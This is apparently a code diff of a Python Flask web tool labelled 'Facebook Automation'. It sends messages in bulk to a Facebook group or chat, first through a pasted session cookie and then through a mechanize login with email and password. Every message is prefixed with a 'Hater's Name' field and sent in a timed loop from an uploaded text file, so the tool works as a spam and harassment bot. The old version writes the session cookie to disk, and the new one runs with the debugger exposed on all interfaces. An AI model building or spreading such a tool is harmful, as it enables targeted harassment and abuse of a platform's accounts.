@@ -1,161 +1,123 @@
 from flask import Flask, request, render_template_string, redirect, url_for
-import requests
-import threading
-import time
 import os
+import datetime
+import time
+from bs4 import BeautifulSoup
+import mechanize
 
+# Flask App Setup
 app = Flask(__name__)
 
-# Global variable to control the loop
-running = False
+# Mechanize Browser Setup
+browser = mechanize.Browser()
+browser.set_handle_robots(False)
+cookies = mechanize.CookieJar()
+browser.set_cookiejar(cookies)
+browser.addheaders = [
+    ('User-agent', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) '
+                   'AppleWebKit/537.36 (KHTML, like Gecko) '
+                   'Chrome/45.0.2454.85 Safari/537.36')]
+browser.set_handle_refresh(False)
 
+# Facebook Login URL
+login_url = 'https://m.facebook.com/login.php'
 
-@app.route('/', methods=['GET', 'POST'])
-def index():
-    global running
-    if request.method == 'POST':
-        # Retrieve form inputs
-        group_id = request.form.get('groupId')
-        cookie = request.form.get('cookie')
-        hater_name = request.form.get('haterName')
-        delay = int(request.form.get('delay'))
+# HTML Template (Inline for simplicity)
+html_template = """
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Automation</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f4f4f4; padding: 20px; }
+        .container { max-width: 600px; margin: auto; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); }
+        h2 { text-align: center; color: #333; }
+        label { display: block; margin: 10px 0 5px; font-weight: bold; }
+        input, textarea, button { width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 4px; }
+        button { background-color: #007BFF; color: #fff; border: none; }
+        button:hover { background-color: #0056b3; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Facebook Automation Tool</h2>
+        <form method="POST" action="/" enctype="multipart/form-data">
+            <label for="email">Facebook Email/Phone:</label>
+            <input type="text" id="email" name="email" required>
+            
+            <label for="password">Facebook Password:</label>
+            <input type="password" id="password" name="password" required>
+            
+            <label for="chat_link">Chat Link:</label>
+            <input type="text" id="chat_link" name="chat_link" required>
+            
+            <label for="haters_name">Hater's Name:</label>
+            <input type="text" id="haters_name" name="haters_name" required>
+            
+            <label for="notepad_file">Upload Message File (.txt):</label>
+            <input type="file" id="notepad_file" name="notepad_file" accept=".txt" required>
+            
+            <label for="delay">Delay (seconds):</label>
+            <input type="number" id="delay" name="delay" value="5" required>
+            
+            <button type="submit">Start Automation</button>
+        </form>
+    </div>
+</body>
+</html>
+"""
 
-        # Read the uploaded message file
-        message_file = request.files['messageFile']
-        messages = message_file.read().decode().splitlines()
+# Helper Functions
+def login_facebook(email, password):
+    """Log in to Facebook using Mechanize."""
+    browser.open(login_url)
+    browser.select_form(nr=0)
+    browser.form['email'] = email
+    browser.form['pass'] = password
+    browser.submit()
+    # Check for login errors
+    response_title = browser.title()
+    if "login" in response_title.lower():
+        raise Exception("Failed to log in to Facebook. Please check credentials.")
 
-        # Create a folder for logs
-        folder_name = f"Logs_Group_{group_id}"
-        os.makedirs(folder_name, exist_ok=True)
-
-        # Save data to logs
-        with open(os.path.join(folder_name, "cookie.txt"), "w") as f:
-            f.write(cookie)
-        with open(os.path.join(folder_name, "messages.txt"), "w") as f:
-            f.write("\n".join(messages))
-
-        # Start the message-sending thread
-        running = True
-        threading.Thread(target=send_messages, args=(group_id, cookie, hater_name, delay, messages)).start()
-        return redirect(url_for('index'))
-
-    elif request.args.get('stop') == '1':
-        running = False
-        return redirect(url_for('index'))
-
-    # HTML template for the webpage
-    return render_template_string('''
-        <!DOCTYPE html>
-        <html lang="en">
-        <head>
-            <meta charset="UTF-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>Facebook Automation</title>
-            <style>
-                body {
-                    background: rgb(0,0,0);
-                    background: radial-gradient(circle, red, green, blue, yellow);
-                    animation: bg-animation 5s infinite;
-                    color: white;
-                    font-family: Arial, sans-serif;
-                }
-                @keyframes bg-animation {
-                    0% { background-position: 0% 50%; }
-                    50% { background-position: 100% 50%; }
-                    100% { background-position: 0% 50%; }
-                }
-                .container {
-                    max-width: 600px;
-                    margin: 50px auto;
-                    padding: 20px;
-                    border-radius: 10px;
-                    background: rgba(0, 0, 0, 0.8);
-                    box-shadow: 0 0 15px white;
-                }
-                .form-control {
-                    width: 100%;
-                    margin-bottom: 15px;
-                    padding: 10px;
-                    border-radius: 5px;
-                    border: 1px solid white;
-                    background: transparent;
-                    color: white;
-                }
-                .btn {
-                    display: inline-block;
-                    padding: 10px 20px;
-                    background: green;
-                    color: white;
-                    border: none;
-                    border-radius: 5px;
-                    cursor: pointer;
-                }
-                .btn:hover {
-                    background: red;
-                }
-            </style>
-        </head>
-        <body>
-            <div class="container">
-                <h1>Facebook Group Message Automation</h1>
-                <form method="POST" enctype="multipart/form-data">
-                    <label for="groupId">Group/Inbox ID:</label>
-                    <input type="text" id="groupId" name="groupId" class="form-control" required>
-                    
-                    <label for="cookie">Facebook Cookie:</label>
-                    <input type="text" id="cookie" name="cookie" class="form-control" required>
-                    
-                    <label for="haterName">Hater's Name:</label>
-                    <input type="text" id="haterName" name="haterName" class="form-control" required>
-                    
-                    <label for="messageFile">Messages (TXT File):</label>
-                    <input type="file" id="messageFile" name="messageFile" class="form-control" accept=".txt" required>
-                    
-                    <label for="delay">Delay (seconds):</label>
-                    <input type="number" id="delay" name="delay" class="form-control" value="5" required>
-                    
-                    <button type="submit" class="btn">Start</button>
-                    <a href="?stop=1" class="btn">Stop</a>
-                </form>
-            </div>
-        </body>
-        </html>
-    ''')
-
-
-def send_messages(group_id, cookie, hater_name, delay, messages):
-    global running
-    headers = {
-        'Connection': 'keep-alive',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
-        'Content-Type': 'application/json',
-        'Cookie': cookie
-    }
-
-    post_url = f"https://graph.facebook.com/v15.0/{group_id}/messages"
-    message_index = 0
-
-    while running:
+def send_message(chat_url, hater_name, messages, delay):
+    """Send messages to the specified chat URL."""
+    for count, message in enumerate(messages, start=1):
         try:
-            message = f"{hater_name} {messages[message_index % len(messages)]}"
-            payload = {
-                'message': message
-            }
-
-            response = requests.post(post_url, json=payload, headers=headers)
-
-            if response.ok:
-                print(f"[+] Message sent: {message}")
-            else:
-                print(f"[x] Failed to send message: {response.text}")
-
-            message_index += 1
+            browser.open(chat_url)
+            browser.select_form(nr=1)
+            browser.form['body'] = f"{hater_name} {message.strip()}"
+            browser.submit()
+            print(f"Message {count}: Sent at {datetime.datetime.now()}")
             time.sleep(delay)
         except Exception as e:
-            print(f"[!] Error: {e}")
-            time.sleep(5)
+            print(f"Error sending message {count}: {e}")
+            time.sleep(10)
 
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+# Flask Routes
+@app.route("/", methods=["GET", "POST"])
+def index():
+    if request.method == "POST":
+        email = request.form.get("email")
+        password = request.form.get("password")
+        chat_link = request.form.get("chat_link")
+        hater_name = request.form.get("haters_name")
+        delay = int(request.form.get("delay"))
         
+        notepad_file = request.files["notepad_file"]
+        messages = notepad_file.read().decode("utf-8").splitlines()
+        
+        try:
+            login_facebook(email, password)
+            send_message(chat_link, hater_name, messages, delay)
+            return "Messages sent successfully!"
+        except Exception as e:
+            return f"Error: {e}"
+    
+    return render_template_string(html_template)
+
+# Run the App
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=5000, debug=True)
